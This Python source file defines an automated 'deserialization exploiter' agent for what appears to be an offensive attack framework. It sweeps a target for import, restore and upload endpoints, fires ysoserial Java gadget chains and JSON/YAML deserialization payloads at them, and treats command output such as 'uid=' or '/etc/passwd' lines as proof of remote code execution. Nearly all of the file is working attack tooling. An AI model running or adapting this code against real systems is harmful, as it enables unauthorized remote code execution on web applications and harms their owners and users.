import asyncio
import subprocess
import base64
from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase, Strategy, ErrorType # Added ErrorType
from core.deserialization_payloads import DeserializationPayloadGenerator
from core.ysoserial_integration import YsoserialIntegration
import requests
import base64
import json
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse


class DeserializationExploiterAgent(BaseAgent):
    """Advanced deserialization exploitation agent"""

    supported_phases = [AttackPhase.INITIAL_FOOTHOLD]
    required_tools = ["java", "requests"]

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.payload_generator: Optional[DeserializationPayloadGenerator] = None
        self.ysoserial: Optional[YsoserialIntegration] = None
        self.exploitation_results = []
        self.vulnerabilities_found = []
        self.report_class = AgentData # Default report class, will be overridden by specific report if needed

    async def setup(self):
        """Asynchronous setup method for DeserializationExploiterAgent."""
        self.payload_generator = await self.context_manager.get_context('payload_generator')
        self.ysoserial = await self.context_manager.get_context('ysoserial')

    async def run(self, strategy: Strategy = None, **kwargs) -> AgentData:
        """Execute deserialization exploitation"""
        try:
            target_url = await self.context_manager.get_context('target_url')
            if not target_url:
                return self.create_report(errors=["Target URL not found in context."], error_type=ErrorType.CONFIGURATION, summary="Deserialization exploitation failed: Target URL missing.")
            base_url = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"

            # Discover deserialization endpoints
            endpoints = await self._discover_deserialization_endpoints(base_url)

            # Test each endpoint with various payloads
            for endpoint in endpoints:
                await self._test_endpoint_deserialization(endpoint, base_url)

            # Generate report
            return self.create_report(
                endpoints_tested=len(endpoints),
                payloads_tested=len(self.exploitation_results),
                vulnerabilities_found=len(self.vulnerabilities_found),
                exploitation_results=self.exploitation_results,
                vulnerabilities=self.vulnerabilities_found,
                summary=f"Deserialization exploitation completed. Tested {len(endpoints)} endpoints, found {len(self.vulnerabilities_found)} vulnerabilities."
            )

        except Exception as e:
            return self.create_report(
                errors=[f"Deserialization exploitation failed: {str(e)}"],
                error_type=ErrorType.LOGIC,
                summary=f"Deserialization exploitation failed due to an unexpected error: {e}"
            )
    async def _discover_deserialization_endpoints(self, base_url: str) -> List[Dict[str, Any]]:
        """Discover potential deserialization endpoints"""
        endpoints = []

        # Common deserialization endpoints
        common_paths = [
            "/api/deserialize",
            "/api/import",
            "/api/load",
            "/api/restore",
            "/api/backup/restore",
            "/admin/import",
            "/admin/backup",
            "/upload/process",
            "/file/process",
            "/data/import",
            "/config/load",
            "/session/restore"
        ]

        for path in common_paths:
            endpoints.append({
                "path": path,
                "method": "POST",
                "content_types": [
                    "application/java-serialized-object",
                    "application/octet-stream",
                    "application/x-java-serialized-object",
                    "application/json",
                    "application/x-yaml",
                    "text/yaml"
                ]
            })

        # Test discovered endpoints
        discovered_endpoints = await self._test_endpoint_discovery(base_url, endpoints)
        endpoints.extend(discovered_endpoints)

        return endpoints

    async def _test_endpoint_discovery(self, base_url: str, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test endpoints to see if they accept deserialization data"""
        discovered = []

        for endpoint in endpoints:
            full_url = urljoin(base_url, endpoint["path"])

            # Test with minimal payload
            test_payload = b"test"

            for content_type in endpoint["content_types"]:
                try:
                    headers = {
                        "Content-Type": content_type,
                        "User-Agent": "dLNkdLNk-Deserialization/1.0"
                    }

                    loop = asyncio.get_running_loop()
                    response = await loop.run_in_executor(None, lambda: requests.post(
                        full_url,
                        data=test_payload,
                        headers=headers,
                        timeout=10
                    ))

                    # Check if endpoint accepts the content type
                    if response.status_code not in [404, 405, 501]:
                        discovered.append({
                            "path": endpoint["path"],
                            "method": endpoint["method"],
                            "content_type": content_type,
                            "status_code": response.status_code,
                            "response_indicators": self._analyze_response_indicators(response)
                        })

                except Exception as e:
                    continue

        return discovered

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute deserialization exploiter agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _analyze_response_indicators(self, response: requests.Response) -> List[str]:
        """Analyze response for deserialization indicators"""
        indicators = []
        response_text = response.text.lower()

        # Java deserialization indicators
        java_indicators = [
            "java.io.objectinputstream",
            "java.io.objectoutputstream",
            "serialization",
            "deserialization",
            "objectinputstream",
            "objectoutputstream"
        ]

        for indicator in java_indicators:
            if indicator in response_text:
                indicators.append(f"Java: {indicator}")

        # Python pickle indicators
        python_indicators = [
            "pickle",
            "cpickle",
            "pickle.loads",
            "pickle.dumps"
        ]

        for indicator in python_indicators:
            if indicator in response_text:
                indicators.append(f"Python: {indicator}")

        # .NET indicators
        dotnet_indicators = [
            "system.runtime.serialization",
            "binaryformatter",
            "soapformatter",
            "datacontractserializer"
        ]

        for indicator in dotnet_indicators:
            if indicator in response_text:
                indicators.append(f".NET: {indicator}")

        return indicators

    async def _test_endpoint_deserialization(self, endpoint: Dict[str, Any], base_url: str):
        """Test endpoint with deserialization payloads"""
        full_url = urljoin(base_url, endpoint["path"])

        # Get appropriate payloads based on content type
        content_type = endpoint.get("content_type", "application/octet-stream")
        payloads = self._get_payloads_for_content_type(content_type)

        for payload in payloads:
            try:
                result = await self._test_payload(full_url, payload, content_type)
                self.exploitation_results.append(result)

                # Check for successful exploitation
                if result.get("success", False):
                    self.vulnerabilities_found.append({
                        "type": "Deserialization Vulnerability",
                        "endpoint": endpoint["path"],
                        "payload": payload.name,
                        "content_type": content_type,
                        "evidence": result.get("evidence", "")
                    })

            except Exception as e:
                self.exploitation_results.append({
                    "endpoint": endpoint["path"],
                    "payload": payload.name,
                    "error": str(e),
                    "success": False
                })

    def _get_payloads_for_content_type(self, content_type: str) -> List:
        """Get appropriate payloads for content type"""
        payloads = []

        if "java" in content_type or "octet-stream" in content_type:
            # Java serialization payloads
            if self.ysoserial.ysoserial_path:
                high_success_gadgets = self.ysoserial.get_high_success_gadgets()
                for gadget in high_success_gadgets[:5]:  # Limit to top 5
                    payload = self.ysoserial.generate_payload(gadget, "id")
                    if payload:
                        payloads.append(payload)

            # Add built-in Java payloads
            java_payloads = self.payload_generator.get_payloads_by_language(
                "java")
            payloads.extend(java_payloads)

        elif "json" in content_type:
            # JSON deserialization payloads
            json_payloads = self.payload_generator.get_payloads_by_format(
                "json")
            payloads.extend(json_payloads)

        elif "yaml" in content_type:
            # YAML deserialization payloads
            yaml_payloads = self.payload_generator.get_payloads_by_format(
                "yaml")
            payloads.extend(yaml_payloads)

        else:
            # Default to high-risk payloads
            high_risk_payloads = self.payload_generator.get_high_risk_payloads()
            payloads.extend(high_risk_payloads)

        return payloads

    async def _test_payload(self, url: str, payload, content_type: str) -> Dict[str, Any]:
        """Test individual payload against endpoint"""
        try:
            headers = {
                "Content-Type": content_type,
                "User-Agent": "dLNkdLNk-Deserialization/1.0"
            }

            # Prepare payload data
            if hasattr(payload, 'payload'):
                payload_data = payload.payload
            else:
                payload_data = payload

            # Send request
            loop = asyncio.get_running_loop()
            response = await loop.run_in_executor(None, lambda: requests.post(
                url,
                data=payload_data,
                headers=headers,
                timeout=30
            ))

            # Analyze response
            success = self._analyze_exploitation_success(response, payload)

            return {
                "url": url,
                "payload": payload.name if hasattr(payload, 'name') else str(payload),
                "content_type": content_type,
                "status_code": response.status_code,
                "response_time": response.elapsed.total_seconds(),
                "response_size": len(response.content),
                "success": success,
                "evidence": response.text[:1000] if success else ""
            }

        except Exception as e:
            return {
                "url": url,
                "payload": payload.name if hasattr(payload, 'name') else str(payload),
                "content_type": content_type,
                "error": str(e),
                "success": False
            }

    def _analyze_exploitation_success(self, response: requests.Response, payload) -> bool:
        """Analyze if exploitation was successful"""
        # Check for command execution indicators
        command_indicators = [
            "uid=",  # id command output
            "root:x:0:0:",  # /etc/passwd
            "total ",  # ls command output
            "drwx",  # directory listing
            "rwx",  # file permissions
        ]

        response_text = response.text.lower()

        # Check for specific indicators based on payload type
        if hasattr(payload, 'command'):
            if payload.command in response_text:
                return True

        # Check for general command execution indicators
        for indicator in command_indicators:
            if indicator in response_text:
                return True

        # Check for error messages that indicate deserialization
        error_indicators = [
            "deserialization",
            "serialization",
            "objectinputstream",
            "pickle",
            "unmarshal"
        ]

        for indicator in error_indicators:
            if indicator in response_text:
                return True

        return False
